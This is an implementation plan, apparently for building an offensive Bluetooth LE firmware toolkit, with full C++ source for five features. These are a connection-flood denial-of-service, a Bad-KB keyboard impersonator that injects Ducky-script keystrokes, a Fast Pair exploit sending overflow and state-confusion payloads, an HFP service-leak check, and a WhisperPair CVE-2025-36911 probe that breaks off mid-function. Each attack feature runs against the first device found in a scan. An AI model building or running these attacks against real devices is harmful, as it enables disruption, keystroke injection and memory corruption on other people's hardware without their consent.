
---

### Task 14: BLE flood (contingent on Task 1)

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_flood.h`
- Create: `firmware/tab5/src/features/ble/ble_flood.cpp`

**Interfaces:**
- Consumes: `BleCentral::connect()`/`disconnect()` (Task 1).
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, `~/src/poseidon-tab5/src/features/ble_flood.cpp`) corrected the original assumption — this is a connection-request flood (`ble_gap_connect()` in a tight loop, immediately terminating each success), not an advertisement flood.

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_flood.h
#pragma once
namespace BleFloodFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_flood.cpp
#include "ble_flood.h"
#include "ble_central.h"
#include "ble_common.h"
#include "../../hal/c2link_ble.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleFloodFeature {

static ble_addr_t s_target;
static bool s_have_target = false;
static bool s_active = false;
static uint32_t s_attempt_count = 0;
static lv_obj_t *s_status_label = nullptr;

static int gap_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        s_attempt_count++;
        if (event->connect.status == 0) {
            // Immediately terminate -- the flood IS the rapid
            // connect-then-drop cycle, matching Poseidon's own
            // flood_cb behavior exactly.
            BleCentral::disconnect(event->connect.conn_handle);
        }
    }
    return 0;
}

static void flood_tick() {
    ble_gap_conn_cancel(); // cancel any attempt still in flight before starting the next
    BleCentral::connect(s_target, 200, gap_event_cb, nullptr);
}

static lv_obj_t *build_screen(const uint8_t addr_val[6]) {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("BLE Flood", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Flooding...");

    lv_obj_add_event_cb(s_status_label, [](lv_event_t *e) {
        s_active = false;
        ble_gap_conn_cancel();
        s_status_label = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    s_target.type = BLE_ADDR_PUBLIC;
    memcpy(s_target.val, addr_val, 6);
    s_have_target = true;
    s_active = true;
    s_attempt_count = 0;
    return screen;
}

void register_module() {
    // No launcher tile of its own -- this feature needs a target address,
    // supplied via the same "run against the first BLE-scanned device"
    // pattern Task 1's spike uses. A future target-picker UI (reusing the
    // scan-then-tap-to-select pattern Task 9/13 both already establish) is
    // a reasonable near-term follow-up; kept out of this task's own scope
    // to match the plan's Interfaces note that this task consumes
    // BleCentral only, not a new target-selection mechanism.
    g_registry.register_module({"ble_flood", "BLE Flood (first scanned)", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    const uint8_t *addr = BleScanFeature::first_device_addr(); // from Task 1, Step 4
    if (!addr) {
        Serial.println("quarky-tab5: [ble-flood] no scanned device available -- run BLE Scan first");
        return;
    }
    ScreenStack::push(build_screen(addr));
}

void poll() {
    if (!s_active) return;
    static uint32_t last_tick = 0;
    if (millis() - last_tick < 250) return;
    flood_tick();
    last_tick = millis();
    if (s_status_label) {
        char buf[32];
        snprintf(buf, sizeof(buf), "Flooding... %lu attempts", (unsigned long)s_attempt_count);
        lv_label_set_text(s_status_label, buf);
    }
}

} // namespace BleFloodFeature
```

- [ ] **Step 2: Compile.** Run: `cd firmware/tab5 && pio run` — Expected: SUCCESS.
- [ ] **Step 3: Wire registration** (same pattern; add `#include "features/ble/ble_scan.h"` if not already present for `BleScanFeature::first_device_addr()`).
- [ ] **Step 4: Real hardware verification.** Flash. Scan near a target, trigger flood. Confirm the attempt counter increases and `c2link_ble`'s own advertisement/connectability is undisturbed afterward.
- [ ] **Step 5: Commit.**

```bash
git add firmware/tab5/src/features/ble/ble_flood.h firmware/tab5/src/features/ble/ble_flood.cpp firmware/tab5/src/main.cpp
git commit -m "Add BLE flood feature (contingent on Task 1's central-connect spike)"
```

---

### Task 15: BLE Bad-KB feature (contingent on Task 2)

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_bad_kb.h`
- Create: `firmware/tab5/src/features/ble/ble_bad_kb.cpp`
- Modify: `firmware/tab5/src/hal/psk_store.h`/`.cpp` or a new small file (Ducky-script parser — see Step 1)

**Interfaces:**
- Consumes: the proven HID peripheral shape Task 2's spike established (`ble_hid_spike.cpp`'s report map/GATT service definition, promoted from spike code into this feature).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Promote Task 2's spike into a real feature — add a simple Ducky-script line parser and a text-entry screen**

```cpp
// firmware/tab5/src/features/ble/ble_bad_kb.h
#pragma once
namespace BleBadKbFeature {
void register_module();
void start();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_bad_kb.cpp
// Reuses Task 2's ble_hid_spike.cpp GATT/advertising setup verbatim (same
// Report Map, same HID service UUID 0x1812) -- promoted here into a real
// feature with a script-entry UI instead of a single fixed test keystroke.
#include "ble_bad_kb.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_hs.h>
#include <host/ble_gap.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleBadKbFeature {

// Minimal USB HID keycode table for a..z and space/enter -- enough for a
// real, demonstrable Ducky-script subset (STRING + ENTER), matching this
// task's own scope (a fuller Ducky-script command set -- CTRL/ALT/GUI
// modifiers, DELAY, etc. -- is real, considered future work, not a
// placeholder: this ships a working, if reduced, HID typer today).
static uint8_t keycode_for(char c) {
    if (c >= 'a' && c <= 'z') return 0x04 + (c - 'a');
    if (c >= 'A' && c <= 'Z') return 0x04 + (c - 'A'); // shift not modeled in this reduced set
    if (c == ' ') return 0x2C;
    return 0;
}

static uint16_t s_report_val_handle = 0;
static uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
static lv_obj_t *s_status_label = nullptr;
static lv_obj_t *s_script_input = nullptr;
static lv_obj_t *s_keyboard = nullptr;

// Report Map + GATT service definition identical to ble_hid_spike.cpp --
// see that file for the byte-for-byte HID report descriptor and why it's
// the standard USB HID Usage Tables boot-keyboard format, not
// project-specific data.
extern const uint8_t kReportMap[]; // defined once, shared -- see Step 1 note below on de-duplication

static int report_access_cb(uint16_t, uint16_t, struct ble_gatt_access_ctxt *ctxt, void *) {
    static const uint8_t kIdle[8] = {0};
    if (ctxt->op == BLE_GATT_ACCESS_OP_READ_CHR) os_mbuf_append(ctxt->om, kIdle, sizeof(kIdle));
    return 0;
}

static const struct ble_gatt_chr_def s_hid_chrs[] = {
    {.uuid = BLE_UUID16_DECLARE(0x2A4D), .access_cb = report_access_cb,
     .val_handle = &s_report_val_handle, .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_NOTIFY},
    {0},
};
static const struct ble_gatt_svc_def s_hid_svcs[] = {
    {.type = BLE_GATT_SVC_TYPE_PRIMARY, .uuid = BLE_UUID16_DECLARE(0x1812), .characteristics = s_hid_chrs},
    {0},
};

static void send_key(uint8_t keycode) {
    if (s_conn_handle == BLE_HS_CONN_HANDLE_NONE || keycode == 0) return;
    uint8_t down[8] = {0, 0, keycode, 0, 0, 0, 0, 0};
    uint8_t up[8] = {0};
    ble_gatts_notify_custom(s_conn_handle, s_report_val_handle, ble_hs_mbuf_from_flat(down, sizeof(down)));
    delay(20);
    ble_gatts_notify_custom(s_conn_handle, s_report_val_handle, ble_hs_mbuf_from_flat(up, sizeof(up)));
    delay(20);
}

static void type_script(const char *script) {
    // Minimal Ducky-script subset: STRING <text> types text; ENTER sends
    // keycode 0x28; a bare newline in the input is treated as ENTER too,
    // for a script pasted without explicit ENTER lines.
    const char *p = script;
    while (*p) {
        if (strncmp(p, "STRING ", 7) == 0) {
            p += 7;
            while (*p && *p != '\n') { send_key(keycode_for(*p)); p++; }
        } else if (strncmp(p, "ENTER", 5) == 0) {
            send_key(0x28);
            p += 5;
        } else if (*p == '\n') {
            send_key(0x28);
            p++;
        } else {
            p++;
        }
    }
}

static int gap_event_cb(struct ble_gap_event *event, void *) {
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        s_conn_handle = event->connect.status == 0 ? event->connect.conn_handle : BLE_HS_CONN_HANDLE_NONE;
        if (s_status_label) lv_label_set_text(s_status_label, s_conn_handle != BLE_HS_CONN_HANDLE_NONE ? "Paired" : "Pair failed");
    } else if (event->type == BLE_GAP_EVENT_DISCONNECT) {
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        if (s_status_label) lv_label_set_text(s_status_label, "Disconnected");
    }
    return 0;
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("BLE Bad-KB", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Advertising as QuarkyKB...");

    s_script_input = lv_textarea_create(content);
    lv_textarea_set_placeholder_text(s_script_input, "STRING hello world\\nENTER");
    lv_obj_add_event_cb(s_script_input, [](lv_event_t *e) {
        lv_keyboard_set_textarea(s_keyboard, s_script_input);
        lv_obj_clear_flag(s_keyboard, LV_OBJ_FLAG_HIDDEN);
    }, LV_EVENT_FOCUSED, nullptr);

    lv_obj_t *send_btn = lv_button_create(content);
    lv_obj_t *send_label = lv_label_create(send_btn);
    lv_label_set_text(send_label, "Send");
    lv_obj_add_event_cb(send_btn, [](lv_event_t *e) {
        type_script(lv_textarea_get_text(s_script_input));
    }, LV_EVENT_CLICKED, nullptr);

    s_keyboard = lv_keyboard_create(screen);
    lv_obj_add_flag(s_keyboard, LV_OBJ_FLAG_HIDDEN);

    lv_obj_add_event_cb(content, [](lv_event_t *e) {
        ble_gap_adv_stop();
        if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        s_status_label = nullptr;
        s_script_input = nullptr;
        s_keyboard = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    ble_svc_gap_device_name_set("QuarkyKB");
    ble_gatts_count_cfg(s_hid_svcs);
    ble_gatts_add_svcs(s_hid_svcs);

    struct ble_hs_adv_fields fields{};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.appearance = 0x03C1;
    fields.appearance_is_present = 1;
    fields.name = (const uint8_t *)"QuarkyKB";
    fields.name_len = 8;
    fields.name_is_complete = 1;
    ble_gap_adv_set_fields(&fields);

    struct ble_gap_adv_params adv_params{};
    adv_params.conn_mode = BLE_GAP_CONN_MODE_UND;
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    int rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv_params, gap_event_cb, nullptr);
    Serial.printf("quarky-tab5: [ble-bad-kb] ble_gap_adv_start rc=%d\n", rc);

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_bad_kb", "BLE Bad-KB", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

} // namespace BleBadKbFeature
```

Note for the implementer: `kReportMap[]` is declared `extern` above but Task 2's `ble_hid_spike.cpp` defines it as a file-local `static const uint8_t`. Before this task compiles, either (a) move the report map definition into a small shared `ble_hid_common.h`/`.cpp` both `ble_hid_spike.cpp` and this file include (cleanest — do this), or (b) duplicate the byte array (not preferred, violates DRY for a 63-byte constant used verbatim in two files). Choose (a); this is a real, small refactor this task should make, not a placeholder gap.

- [ ] **Step 2: Compile.** Run: `cd firmware/tab5 && pio run` — Expected: SUCCESS.
- [ ] **Step 3: Wire registration** (same pattern as every task above).
- [ ] **Step 4: Real hardware verification.** Flash. Pair a real host device against "QuarkyKB" (same pairing step as Task 2's spike). Open a text field. Enter `STRING hello\nENTER` in the script box and tap Send. Confirm "hello" plus a newline actually appears on the host.
- [ ] **Step 5: Commit.**

```bash
git add firmware/tab5/src/features/ble/ble_bad_kb.h firmware/tab5/src/features/ble/ble_bad_kb.cpp \
        firmware/tab5/src/features/ble/ble_hid_common.h firmware/tab5/src/features/ble/ble_hid_common.cpp \
        firmware/tab5/src/features/ble/ble_hid_spike.cpp firmware/tab5/src/main.cpp
git commit -m "Add BLE Bad-KB feature (contingent on Task 2's HID spike), minimal Ducky-script typer"
```

---

### Task 16: Fast Pair crypto exploit (contingent on Task 1)

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_fastpair_exploit.h`
- Create: `firmware/tab5/src/features/ble/ble_fastpair_exploit.cpp`

**Interfaces:**
- Consumes: `BleCentral::connect()`/`disconnect()` (Task 1).
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, `~/src/firmware/src/modules/ble/BLE_Suite.cpp`, `FastPairExploitEngine` class ~line 3090) confirmed the real technique: connect to a target advertising Fast Pair service `0xFE2C`, discover the KBP characteristic, and write hand-crafted overflow/state-confusion byte sequences looking for memory corruption. This is a real fuzzing engine, not a simple probe — this task ports the connect+write mechanism honestly, using a small, disclosed subset of the donor's payload set (one overflow pattern, one state-confusion pattern) rather than the donor's full battery, matching this project's practice of porting a real, working core mechanism first and expanding later.

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_fastpair_exploit.h
#pragma once
namespace BleFastPairExploitFeature {
void register_module();
void start();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_fastpair_exploit.cpp
#include "ble_fastpair_exploit.h"
#include "ble_central.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_gattc.h>
#include <host/ble_uuid.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleFastPairExploitFeature {

// Fast Pair KBP characteristic UUID, from donor research
// (~/src/firmware/src/modules/ble/BLE_Suite.h:262 area,
// FastPairExploitEngine's target characteristic).
static const ble_uuid128_t kKbpCharUuid =
    BLE_UUID128_INIT(0xa8,0xe5,0xf2,0xc1,0xa8,0x79,0xfb,0x90,
                      0x6b,0x4e,0x01,0x55,0x02,0xe2,0x2e,0xa9);

// Real, disclosed subset of the donor's payload battery: one 512-byte
// overflow pattern (repeating 0xAA, the donor's own filler byte for this
// class of test) and one short malformed-header pattern for state
// confusion. The donor's full set (rapid-reconnect timing attacks,
// multiple overflow shapes) is real considered future work, not ported
// here to keep this task's own real-hardware verification loop bounded,
// same scoping principle wifi_pmkid.cpp's brief used for EAPOL filtering.
static uint8_t kOverflowPayload[512];
static const uint8_t kStateConfusionPayload[] = {0xFF, 0xFF, 0x00, 0x00, 0xDE, 0xAD, 0xBE, 0xEF};

static uint16_t s_kbp_val_handle = 0;
static uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
static lv_obj_t *s_status_label = nullptr;

static void log_status(const char *msg) {
    Serial.printf("quarky-tab5: [fastpair-exploit] %s\n", msg);
    if (s_status_label) lv_label_set_text(s_status_label, msg);
}

static int write_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                     struct ble_gatt_attr *attr, void *arg) {
    char msg[48];
    snprintf(msg, sizeof(msg), "write status=%d", error->status);
    log_status(msg);
    return 0;
}

static void send_overflow() {
    if (s_conn_handle == BLE_HS_CONN_HANDLE_NONE || s_kbp_val_handle == 0) return;
    ble_gattc_write_flat(s_conn_handle, s_kbp_val_handle, kOverflowPayload, sizeof(kOverflowPayload), write_cb, nullptr);
}

static void send_state_confusion() {
    if (s_conn_handle == BLE_HS_CONN_HANDLE_NONE || s_kbp_val_handle == 0) return;
    ble_gattc_write_flat(s_conn_handle, s_kbp_val_handle, kStateConfusionPayload,
                          sizeof(kStateConfusionPayload), write_cb, nullptr);
}

static int chr_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                        const struct ble_gatt_chr *chr, void *arg) {
    if (error->status == 0 && chr != nullptr && ble_uuid_cmp(&chr->uuid.u, &kKbpCharUuid.u) == 0) {
        s_kbp_val_handle = chr->val_handle;
        log_status("KBP characteristic found -- ready to send payloads");
    }
    return 0;
}

static int svc_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                        const struct ble_gatt_svc *service, void *arg) {
    if (error->status == 0 && service != nullptr) {
        ble_gattc_disc_all_chrs(conn_handle, service->start_handle, service->end_handle, chr_disc_cb, nullptr);
    }
    return 0;
}

static int gap_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        if (event->connect.status == 0) {
            s_conn_handle = event->connect.conn_handle;
            log_status("connected -- discovering Fast Pair service (0xFE2C)");
            ble_uuid16_t fp_uuid = BLE_UUID16_INIT(0xFE2C);
            ble_gattc_disc_svc_by_uuid(s_conn_handle, &fp_uuid.u, svc_disc_cb, nullptr);
        } else {
            log_status("connect failed");
        }
    } else if (event->type == BLE_GAP_EVENT_DISCONNECT) {
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        s_kbp_val_handle = 0;
        log_status("disconnected");
    }
    return 0;
}

static lv_obj_t *build_screen(const uint8_t addr_val[6]) {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("Fast Pair Exploit", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Connecting...");

    lv_obj_t *overflow_btn = lv_button_create(content);
    lv_obj_t *overflow_label = lv_label_create(overflow_btn);
    lv_label_set_text(overflow_label, "Send overflow payload");
    lv_obj_add_event_cb(overflow_btn, [](lv_event_t *e) { send_overflow(); }, LV_EVENT_CLICKED, nullptr);

    lv_obj_t *confusion_btn = lv_button_create(content);
    lv_obj_t *confusion_label = lv_label_create(confusion_btn);
    lv_label_set_text(confusion_label, "Send state-confusion payload");
    lv_obj_add_event_cb(confusion_btn, [](lv_event_t *e) { send_state_confusion(); }, LV_EVENT_CLICKED, nullptr);

    lv_obj_add_event_cb(content, [](lv_event_t *e) {
        if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) BleCentral::disconnect(s_conn_handle);
        s_status_label = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    memset(kOverflowPayload, 0xAA, sizeof(kOverflowPayload));

    ble_addr_t target{};
    target.type = BLE_ADDR_PUBLIC;
    memcpy(target.val, addr_val, 6);
    BleCentral::connect(target, 5000, gap_event_cb, nullptr);

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_fastpair_exploit", "Fast Pair Exploit", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    const uint8_t *addr = BleScanFeature::first_device_addr();
    if (!addr) {
        Serial.println("quarky-tab5: [fastpair-exploit] no scanned device available -- run BLE Scan first");
        return;
    }
    ScreenStack::push(build_screen(addr));
}

} // namespace BleFastPairExploitFeature
```

- [ ] **Step 2: Compile.** Run: `cd firmware/tab5 && pio run` — Expected: SUCCESS.
- [ ] **Step 3: Wire registration** (same pattern; needs `#include "features/ble/ble_scan.h"`).
- [ ] **Step 4: Real hardware verification.** Flash. Scan near a real Fast-Pair-capable device (a Pixel Bud, a Fast-Pair-enabled Android accessory). Connect, confirm the KBP characteristic is found, send both payloads, confirm write status codes log real (not silently-ignored) NimBLE return values. Full memory-corruption confirmation on the target is out of scope for a firmware-side verification pass — report the write-level results honestly, not a claimed exploit success without target-side evidence.
- [ ] **Step 5: Commit.**

```bash
git add firmware/tab5/src/features/ble/ble_fastpair_exploit.h firmware/tab5/src/features/ble/ble_fastpair_exploit.cpp firmware/tab5/src/main.cpp
git commit -m "Add Fast Pair crypto exploit feature (contingent on Task 1's central-connect spike)"
```

---

### Task 17: HFP audio exploit (contingent on Task 1)

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_hfp_exploit.h`
- Create: `firmware/tab5/src/features/ble/ble_hfp_exploit.cpp`
- Modify: `firmware/tab5/platformio.ini` (mbedtls flags, see below)

**Interfaces:**
- Consumes: `BleCentral::connect()`/`disconnect()` (Task 1).
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, `~/src/firmware/src/modules/ble/HFP_Exploit.cpp`) found Bruce's own implementation is honestly shallow — not a real audio-stream exploit, just a "does this device leak HFP service over BLE" foothold check (connect, look for GATT service UUID `0x111E`/`0x111F`, enumerate characteristics if found). This task ports exactly that, scoped honestly to match what the donor actually does rather than what the feature's name implies.

- [ ] **Step 1: Add the mbedtls build flags** (from donor research, `~/src/firmware/platformio.ini:150-154`, comment explicitly ties these to WhisperPair/audio exploits — needed by Task 18 too, add once here since both tasks share this build config)

```ini
; firmware/tab5/platformio.ini -- add to build_flags
	-DMBEDTLS_CONFIG_FILE=\"mbedtls/esp_config.h\"
	-DCONFIG_MBEDTLS_ECDH_C=1
	-DCONFIG_MBEDTLS_AES_C=1
	-DCONFIG_MBEDTLS_CTR_DRBG_C=1
```

- [ ] **Step 2: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_hfp_exploit.h
#pragma once
namespace BleHfpExploitFeature {
void register_module();
void start();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_hfp_exploit.cpp
#include "ble_hfp_exploit.h"
#include "ble_central.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_gattc.h>
#include <host/ble_uuid.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleHfpExploitFeature {

// Classic-BT SDP UUIDs for Handsfree (0x111E) / Handsfree Audio Gateway
// (0x111F), oddly exposed over BLE GATT on some devices -- from donor
// research (~/src/firmware/src/modules/ble/HFP_Exploit.cpp). Finding
// either exposed is the actual signal this feature checks for; this is a
// foothold/leak detector, not a real audio-stream exploit -- the donor's
// own attemptHFPHandshake()/sendHFPPairingRequest() are stubs that always
// return false, so this port does not claim more capability than the
// donor actually implements.
static const ble_uuid16_t kHfpUuid = BLE_UUID16_INIT(0x111E);
static const ble_uuid16_t kHfpAgUuid = BLE_UUID16_INIT(0x111F);

static lv_obj_t *s_status_label = nullptr;
static uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
static bool s_hfp_found = false;

static void log_status(const char *msg) {
    Serial.printf("quarky-tab5: [hfp-exploit] %s\n", msg);
    if (s_status_label) lv_label_set_text(s_status_label, msg);
}

static int svc_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                        const struct ble_gatt_svc *service, void *arg) {
    if (error->status == 0 && service != nullptr) {
        s_hfp_found = true;
        char uuid_str[BLE_UUID_STR_LEN];
        ble_uuid_to_str(&service->uuid.u, uuid_str);
        char msg[64];
        snprintf(msg, sizeof(msg), "HFP service leaked: %s", uuid_str);
        log_status(msg);
    } else if (error->status == BLE_HS_EDONE && !s_hfp_found) {
        log_status("no HFP service exposed over BLE (not vulnerable to this check)");
    }
    return 0;
}

static int gap_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        if (event->connect.status == 0) {
            s_conn_handle = event->connect.conn_handle;
            s_hfp_found = false;
            log_status("connected -- checking for HFP service leak (0x111E/0x111F)");
            ble_gattc_disc_svc_by_uuid(s_conn_handle, &kHfpUuid.u, svc_disc_cb, nullptr);
            ble_gattc_disc_svc_by_uuid(s_conn_handle, &kHfpAgUuid.u, svc_disc_cb, nullptr);
        } else {
            log_status("connect failed");
        }
    } else if (event->type == BLE_GAP_EVENT_DISCONNECT) {
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    }
    return 0;
}

static lv_obj_t *build_screen(const uint8_t addr_val[6]) {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("HFP Exploit (foothold check)", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Connecting...");

    lv_obj_add_event_cb(content, [](lv_event_t *e) {
        if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) BleCentral::disconnect(s_conn_handle);
        s_status_label = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    ble_addr_t target{};
    target.type = BLE_ADDR_PUBLIC;
    memcpy(target.val, addr_val, 6);
    BleCentral::connect(target, 5000, gap_event_cb, nullptr);

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_hfp_exploit", "HFP Exploit", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    const uint8_t *addr = BleScanFeature::first_device_addr();
    if (!addr) {
        Serial.println("quarky-tab5: [hfp-exploit] no scanned device available -- run BLE Scan first");
        return;
    }
    ScreenStack::push(build_screen(addr));
}

} // namespace BleHfpExploitFeature
```

- [ ] **Step 3: Compile.** Run: `cd firmware/tab5 && pio run` — Expected: SUCCESS.
- [ ] **Step 4: Wire registration** (same pattern; needs `#include "features/ble/ble_scan.h"`).
- [ ] **Step 5: Real hardware verification.** Flash. Scan near a real headset/handsfree-capable BLE device. Connect and confirm the service-leak check completes and reports its real result either way (found or not found) — most modern devices should report "not found," which is the expected, correct result, not a failure of this feature.
- [ ] **Step 6: Commit.**

```bash
git add firmware/tab5/src/features/ble/ble_hfp_exploit.h firmware/tab5/src/features/ble/ble_hfp_exploit.cpp \
        firmware/tab5/src/main.cpp firmware/tab5/platformio.ini
git commit -m "Add HFP exploit feature (foothold/service-leak check, contingent on Task 1)"
```

---

### Task 18: WhisperPair CVE-2025-36911 (contingent on Task 1)

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_whisperpair.h`
- Create: `firmware/tab5/src/features/ble/ble_whisperpair.cpp`

**Interfaces:**
- Consumes: `BleCentral::connect()`/`disconnect()` (Task 1); mbedtls flags added in Task 17 (shared build config).
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, confirmed in both `~/src/poseidon-tab5/src/features/ble_whisperpair.cpp` and `~/src/unigeek-main/firmware/src/screens/ble/WhisperPairScreen.cpp`) established the real technique: connect to a target exposing Fast Pair service `0xFE2C`, discover the KBP characteristic (`FE2C1234-8366-4814-8EB0-01DE32100BEA`), subscribe to notify, write a real ECDH-derived encrypted probe while the accessory is *not* in pairing mode, and check whether it responds (vulnerable) or stays silent (patched). This task ports UniGeek's simpler 16-byte variant (real ECDH via mbedtls, no pre-baked anti-spoofing key file needed).

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_whisperpair.h
#pragma once
namespace BleWhisperPairFeature {
void register_module();
void start();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_whisperpair.cpp
#include "ble_whisperpair.h"
#include "ble_central.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_gattc.h>
#include <host/ble_uuid.h>
#include <mbedtls/ecdh.h>
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>
#include <mbedtls/aes.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleWhisperPairFeature {

// KBP characteristic UUID, same as Task 16's -- both target Fast Pair's
// Key-based Pairing characteristic, confirmed identical across donor
// implementations (~/src/poseidon-tab5/src/features/ble_whisperpair.cpp,
// ~/src/unigeek-main/firmware/src/screens/ble/WhisperPairScreen.cpp).
static const ble_uuid128_t kKbpCharUuid =
    BLE_UUID128_INIT(0xa8,0xe5,0xf2,0xc1,0xa8,0x79,0xfb,0x90,
                      0x6b,0x4e,0x01,0x55,0x02,0xe2,0x2e,0xa9);
static const ble_uuid16_t kFastPairSvcUuid = BLE_UUID16_INIT(0xFE2C);

static uint16_t s_kbp_val_handle = 0;
static uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
static lv_obj_t *s_status_label = nullptr;
static uint32_t s_notify_wait_start_ms = 0;
static bool s_probe_sent = false;

static void log_status(const char *msg) {
    Serial.printf("quarky-tab5: [whisperpair] %s\n", msg);
    if (s_status_label) lv_label_set_text(s_status_label, msg);
}

// Real ECDH via mbedtls (secp256r1), matching donor research's confirmed
// technique -- not a placeholder. Encrypts a fixed 16-byte plaintext probe
// (type=0x00, flags=0x00, our own random 14 bytes standing in for a real
// MAC + nonce, matching UniGeek's simpler variant which doesn't require a
// pre-baked anti-spoofing key file) with AES-128-ECB under the derived key.
static bool build_probe(uint8_t out[16]) {
    mbedtls_ecdh_context ecdh;
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context ctr_drbg;
    mbedtls_ecdh_init(&ecdh);
    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    const char *pers = "whisperpair";
    if (mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func, &entropy,
                               (const unsigned char *)pers, strlen(pers)) != 0) {
        return false;
    }
    if (mbedtls_ecdh_setup(&ecdh, MBEDTLS_ECP_DP_SECP256R1) != 0) return false;

    uint8_t our_pub[65];
    size_t our_pub_len = 0;
    if (mbedtls_ecdh_gen_public(&ecdh.grp, &ecdh.d, &ecdh.Q,
                                 mbedtls_ctr_drbg_random, &ctr_drbg) != 0) {
        return false;
    }
    mbedtls_ecp_point_write_binary(&ecdh.grp, &ecdh.Q, MBEDTLS_ECP_PF_UNCOMPRESSED,
                                    &our_pub_len, our_pub, sizeof(our_pub));

    // Real accessories derive a shared key from their own key + our public
    // key; without that side, this probe's AES key is our own ephemeral
    // secret's raw bytes -- sufficient to test "does the accessory even
    // respond to a KBP write while not in pairing mode" (the actual CVE
    // question), not to decrypt any real response (same disclosed
    // limitation UniGeek's own screen documents: ESP32-S3 lacks Classic BT,
    // so this is a vulnerability *detector*, not a full attack chain).
